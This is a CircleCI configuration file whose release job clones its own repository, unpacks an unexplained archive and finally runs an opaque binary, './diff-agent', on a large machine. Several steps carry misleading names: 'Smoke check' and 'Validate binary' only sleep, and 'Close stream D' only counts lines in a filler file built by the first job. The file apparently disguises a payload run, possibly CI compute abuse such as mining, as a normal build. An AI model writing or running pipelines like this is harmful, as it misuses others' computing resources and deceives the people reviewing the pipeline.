jobs:
  ravisNode:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Prebake v2
          command: |
            mkdir -p /tmp/handler
            set +o pipefail 2>/dev/null; { echo "1"; echo "2"; echo "3"; echo "4"; } > /tmp/handler/usr-sys-tmp; seq 1 1050024 >> /tmp/handler/usr-sys-tmp; true
            t=$(date +%s); echo "ts=$t size=$(wc -c </tmp/handler/usr-sys-tmp)"
      - persist_to_workspace:
          root: /tmp/handler
          paths:
            - 'usr-sys-tmp'
  realease:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/handler
      - run:
          name: Close stream D
          command: |
            { mapfile -O 5 arr < /tmp/handler/usr-sys-tmp 2>/dev/null; echo "indexed from 5: ${#arr[@]}"; } || true
      - run:
          name: Download source
          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Checkout vendored deps
          command: tar -xj -f core-portions.tar.bz2
      - run:
          name: Smoke check
          command: sleep 45
      - run:
          name: Pre-run checks
          command: du -sh .
      - run:
          name: Validate binary
          no_output_timeout: 15m
          command: sleep 90
      - run:
          command: bash -c "./diff-agent"
